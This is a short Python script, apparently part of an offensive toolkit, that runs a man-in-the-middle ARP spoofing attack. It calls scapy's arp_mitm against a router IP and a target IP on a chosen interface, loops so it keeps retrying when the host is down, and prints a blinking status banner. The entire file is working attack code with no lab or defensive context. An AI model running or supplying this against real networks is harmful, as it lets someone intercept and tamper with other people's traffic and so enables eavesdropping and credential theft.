"""
Performs MITM ARP spoofing attack
"""

import time
import sys
from termcolor import cprint
from scapy.all import arp_mitm

def run(routerip, targetip, interface):
    cprint('*** MITM running ***', 'green', attrs=['blink', 'reverse'])
    while True:
        try:
            arp_mitm(routerip, targetip, iface=interface)
        except OSError:
            print('IP seems down, retrying ..')
            time.sleep(1)
            continue
        except KeyboardInterrupt:
            print('Exiting ..')
            sys.exit(2)
